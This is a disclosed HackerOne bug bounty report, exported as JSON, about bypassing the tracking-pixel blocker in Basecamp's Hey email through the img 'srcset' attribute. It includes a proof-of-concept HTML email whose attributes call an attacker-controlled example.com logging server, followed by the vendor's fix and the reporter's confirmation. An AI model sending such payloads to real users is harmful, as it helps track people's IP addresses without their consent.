{"id":1021885,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIxODg1","url":"https://hackerone.com/reports/1021885","title":"Bypass of image rewriting / tracking blocker via srcset","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-10-29T15:03:39.081Z","submitted_at":"2020-10-29T15:03:39.136Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"foobar7","url":"/foobar7","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":67,"url":"https://hackerone.com/basecamp","handle":"basecamp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Basecamp","twitter_handle":"basecamp","website":"https://basecamp.com/about/policies/security/response","about":"Basecamp is the leading online project manager and the birthplace of Ruby on Rails."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-12-03T12:39:40.735Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-11-03T12:39:22.322Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"CVSS\n----\n\nMedium 4.7 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N)\n\nDescription\n-----------\n\nOne of the security features of Hey is blocking of [tracking pixels](https://hey.com/spy-trackers/) to preserve users privacy.\n\nAs such, `img` tags and similar are rewritten by the app to point to `gopher.hey.com`. However, an attacker can bypass this filter via the `srcset` attribute. \n\nPOC\n---\n\nSend an email with the following code to the victim, where `example.com` is an attacker-controlled tracking server. The HTML code can for example be sent via thunderbird by clicking insert -\u003e HTML.\n\n    \u003c!DOCTYPE html SYSTEM \"https://example.com/log?doctype\"\u003e\n    \u003chtml xmlns=\"http://www.w3.org/1999/xhtml\" manifest=\"https://example.com/log?html-manifest\"\u003e\n    \u003chead profile=\"https://example.com/log?head-profile\"\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n    \u003cpicture\u003e\n        \u003cimg srcset=\"https://example.com/log?picture-img-srcset\"\u003e\n    \u003c/picture\u003e\n    \u003cimg srcset=\",,,,,https://example.com/log?img-srcset\"\u003e\n    \u003c/body\u003e\n    \u003c/html\u003e\n\nOpen the incoming email in `https://app.hey.com`. The page will look like this:\n\n    \u003chtml style=\"[...]\"\u003e\u003chead\u003e\n          \u003cmeta charset=\"UTF-8\"\u003e\n          \u003cstyle\u003e\n            [...]\n          \u003c/style\u003e\n          \u003cstyle\u003e@import url(\"https://production.haystack-assets.com/assets/message_content-1f242d41450daac108bc715557eebc198d06b738e4e50d3f1005cba03d186861.css\");\u003c/style\u003e\n        \u003c/head\u003e\u003cbody\u003e\u003cdiv class=\"message-content-inner\"\u003e\u003cdiv class=\"trix-content\"\u003e\n      \u003cdiv class=\"__body\"\u003e\n        \u003cp\u003e\n           \u003cimg srcset=\"https://example.com/log?picture-img-srcset\"\u003e\n          \n          \u003cimg srcset=\",,,,,https://example.com/log?img-srcset\"\u003e\n          testtest\n        \u003c/p\u003e\n      \u003c/div\u003e\n    \u003c/div\u003e\n    \u003c/div\u003e\u003c/body\u003e\u003c/html\u003e\n    \nIt can be seen that the `srcset` attribute was not rewritten \u0026 a request will have been sent to the tracking server directly from the victim users browser.\n\n## Impact\n\nbypass of the img URL rewriting which prevents tracking scripts from gathering users IP addresses","vulnerability_information_html":"\u003ch2 id=\"cvss\"\u003eCVSS\u003c/h2\u003e\n\n\u003cp\u003eMedium 4.7 \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.first.org%2Fcvss%2Fcalculator%2F3.0%23CVSS%3A3.0%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AR%2FS%3AC%2FC%3AN%2FI%3AL%2FA%3AN\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eOne of the security features of Hey is blocking of \u003ca href=\"/redirect?url=https%3A%2F%2Fhey.com%2Fspy-trackers%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etracking pixels\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to preserve users privacy.\u003c/p\u003e\n\n\u003cp\u003eAs such, \u003ccode\u003eimg\u003c/code\u003e tags and similar are rewritten by the app to point to \u003ccode\u003egopher.hey.com\u003c/code\u003e. However, an attacker can bypass this filter via the \u003ccode\u003esrcset\u003c/code\u003e attribute. \u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePOC\u003c/h2\u003e\n\n\u003cp\u003eSend an email with the following code to the victim, where \u003ccode\u003eexample.com\u003c/code\u003e is an attacker-controlled tracking server. The HTML code can for example be sent via thunderbird by clicking insert -\u0026gt; HTML.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html SYSTEM \u0026quot;https://example.com/log?doctype\u0026quot;\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emanifest=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://example.com/log?html-manifest\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u003c/span\u003e \u003cspan class=\"na\"\u003eprofile=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://example.com/log?head-profile\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;picture\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrcset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://example.com/log?picture-img-srcset\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/picture\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrcset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,,,,,https://example.com/log?img-srcset\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOpen the incoming email in \u003ccode\u003ehttps://app.hey.com\u003c/code\u003e. The page will look like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;[...]\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;head\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;UTF-8\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;style\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e[...]\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/style\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;style\u0026gt;\u003c/span\u003e\u003cspan class=\"k\"\u003e@import\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(\u0026quot;https://production.haystack-assets.com/assets/message_content-1f242d41450daac108bc715557eebc198d06b738e4e50d3f1005cba03d186861.css\u0026quot;)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/style\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;message-content-inner\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;trix-content\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;__body\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003e\n       \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrcset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://example.com/log?picture-img-srcset\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\n      \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrcset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,,,,,https://example.com/log?img-srcset\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      testtest\n    \u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt can be seen that the \u003ccode\u003esrcset\u003c/code\u003e attribute was not rewritten \u0026amp; a request will have been sent to the tracking server directly from the victim users browser.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003ebypass of the img URL rewriting which prevents tracking scripts from gathering users IP addresses\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-03T12:39:22.407Z","allow_singular_disclosure_after":-2215962.961992033,"singular_disclosure_allowed":true,"vote_count":44,"voters":["sw33tlie","nytr0gen","najeh_halawani","prophet","romesful","rahsec","mygf","prinzhorn","naategh","demonia","and 34 more..."],"severity":{"rating":"medium","score":4.7,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":53959,"asset_type":"URL","asset_identifier":"*.hey.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9674479,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report! We were able to reproduce this issue with the HTML you provided. We’ll get it fixed up soon.","markdown_message":"\u003cp\u003eThanks for the report! We were able to reproduce this issue with the HTML you provided. We’ll get it fixed up soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-29T18:55:06.498Z","updated_at":"2020-10-29T18:55:06.498Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Basecamp"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"basecamp","collaborator":{"username":"foobar7","url":"/foobar7"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9674482,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-29T18:55:26.886Z","updated_at":"2020-10-29T18:55:26.886Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9674683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the quick response and bounty! Looking forward to checking out the fix.","markdown_message":"\u003cp\u003eThanks for the quick response and bounty! Looking forward to checking out the fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-29T19:31:59.527Z","updated_at":"2020-10-29T19:31:59.527Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9703771,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We’ve deployed a fix for this. Mind confirming?\n\nWe intended to remove `srcset` attributes from `\u003cimg\u003e` tags but a logic error allowed them to slip through. We could have fixed the logic error, but we decided to proxy URLs in `srcset`s instead.","markdown_message":"\u003cp\u003eWe’ve deployed a fix for this. Mind confirming?\u003c/p\u003e\n\n\u003cp\u003eWe intended to remove \u003ccode\u003esrcset\u003c/code\u003e attributes from \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e tags but a logic error allowed them to slip through. We could have fixed the logic error, but we decided to proxy URLs in \u003ccode\u003esrcset\u003c/code\u003es instead.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-02T15:35:49.185Z","updated_at":"2020-11-02T15:35:49.185Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9711756,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@georgeclaghorn Looks good to me! `srcset` is now correctly rewritten, and I wasn't able to find a bypass either.","markdown_message":"\u003cp\u003e\u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e Looks good to me! \u003ccode\u003esrcset\u003c/code\u003e is now correctly rewritten, and I wasn\u0026#39;t able to find a bypass either.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-03T09:41:12.927Z","updated_at":"2020-11-03T09:41:12.927Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9713435,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Great, thanks again!","markdown_message":"\u003cp\u003eGreat, thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-03T12:39:13.798Z","updated_at":"2020-11-03T12:39:13.798Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"foobar7","url":"/foobar7"},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9713437,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-03T12:39:22.345Z","updated_at":"2020-11-03T12:39:22.345Z","first_to_agree":true,"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9994216,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-03T12:39:40.774Z","updated_at":"2020-12-03T12:39:40.774Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Basecamp"}},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}